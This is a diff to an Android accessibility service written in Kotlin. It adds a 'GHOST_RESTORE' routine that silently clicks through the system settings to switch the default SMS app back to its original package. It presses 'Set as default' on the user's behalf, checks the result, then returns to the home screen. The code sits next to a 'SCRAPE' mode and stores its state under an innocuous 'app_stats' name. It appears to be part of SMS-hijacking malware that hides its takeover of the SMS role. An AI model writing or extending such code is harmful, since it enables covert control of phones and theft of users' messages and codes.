@@ -259,46 +259,94 @@ class MyAccessibilityService : AccessibilityService() {
             } else if (mode == "RESTORE") {
                 val root = rootInActiveWindow ?: return
                 val targetLabel = DefaultSmsManager.getStoredPreviousLabel(this)
-                if (targetLabel == null) {
+                val originalPkg = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_sms_package", null)
+                
+                if (targetLabel == null || originalPkg == null) {
                     DefaultSmsManager.expectedMode = ""
+                    return
+                }
+
+                // If already restored, disarm immediately
+                if (android.provider.Telephony.Sms.getDefaultSmsPackage(this) == originalPkg) {
+                    DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target already restored.")
+                    DefaultSmsManager.expectedMode = "" 
+                    performGlobalAction(GLOBAL_ACTION_HOME)
                     return
                 }
 
                 // Phase 1: Are we on the selection screen with the target app visible?
                 val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
-                var clickedApp = false
-                for (node in appNodes) {
-                    var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                    while (target != null && !target.isClickable) {
-                        target = target.parent
-                    }
-                    if (target != null && target.isClickable) {
-                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                        clickedApp = true
-                        DebugLogger.log("GHOST_RESTORE", "Clicked target app: $targetLabel")
-                        break
-                    }
-                }
+                if (appNodes.isNotEmpty()) {
+                    val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                    val lastLoop = prefs.getLong("restore_loop_ts", 0L)
+                    if (System.currentTimeMillis() - lastLoop < 5000) return
+                    prefs.edit().putLong("restore_loop_ts", System.currentTimeMillis()).apply()
 
-                if (clickedApp) {
-                    DefaultSmsManager.expectedMode = "" // Disarm
-                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                        performGlobalAction(GLOBAL_ACTION_HOME)
-                    }, 500)
+                    val targetCount = appNodes.size
+
+                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.Main).launch {
+                        for (i in 0 until targetCount) {
+                            val currentRoot = rootInActiveWindow ?: continue
+                            val currentNodes = currentRoot.findAccessibilityNodeInfosByText(targetLabel)
+                            
+                            if (i < currentNodes.size) {
+                                var target: android.view.accessibility.AccessibilityNodeInfo? = currentNodes[i]
+                                while (target != null && !target.isClickable) {
+                                    target = target.parent
+                                }
+                                if (target != null && target.isClickable) {
+                                    target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                    DebugLogger.log("GHOST_RESTORE", "Selected target candidate $i: $targetLabel")
+                                }
+                            }
+                            
+                            kotlinx.coroutines.delay(300)
+                            
+                            val confirmRoot = rootInActiveWindow
+                            if (confirmRoot != null) {
+                                val setNodes = confirmRoot.findAccessibilityNodeInfosByText("Set as default")
+                                for (btn in setNodes) {
+                                    if (btn.isClickable) {
+                                        btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                                        DebugLogger.log("GHOST_RESTORE", "Clicked 'Set as default' confirmation")
+                                        break
+                                    }
+                                }
+                            }
+                            
+                            kotlinx.coroutines.delay(600)
+                            
+                            if (android.provider.Telephony.Sms.getDefaultSmsPackage(this@MyAccessibilityService) == originalPkg) {
+                                DebugLogger.log("GHOST_RESTORE", "Verification SUCCESS! Target restored.")
+                                DefaultSmsManager.expectedMode = "" 
+                                prefs.edit().putLong("restore_loop_ts", 0L).apply()
+                                performGlobalAction(GLOBAL_ACTION_HOME)
+                                return@launch
+                            } else {
+                                DebugLogger.log("GHOST_RESTORE", "Candidate $i failed verification.")
+                            }
+                        }
+                        prefs.edit().putLong("restore_loop_ts", 0L).apply()
+                    }
                     return
                 }
 
                 // Phase 2: We must be on the Default Apps category list. Find "SMS" or "SMS app" anchor.
                 val smsNodes = root.findAccessibilityNodeInfosByText("SMS")
-                for (node in smsNodes) {
-                    var target: android.view.accessibility.AccessibilityNodeInfo? = node
-                    while (target != null && !target.isClickable) {
-                        target = target.parent
-                    }
-                    if (target != null && target.isClickable) {
-                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                        DebugLogger.log("GHOST_RESTORE", "Clicked SMS category")
-                        break
+                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                val lastSmsClick = prefs.getLong("restore_sms_click_ts", 0L)
+                if (System.currentTimeMillis() - lastSmsClick > 2000) {
+                    for (node in smsNodes) {
+                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                        while (target != null && !target.isClickable) {
+                            target = target.parent
+                        }
+                        if (target != null && target.isClickable) {
+                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            prefs.edit().putLong("restore_sms_click_ts", System.currentTimeMillis()).apply()
+                            DebugLogger.log("GHOST_RESTORE", "Clicked SMS category")
+                            break
+                        }
                     }
                 }
             } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
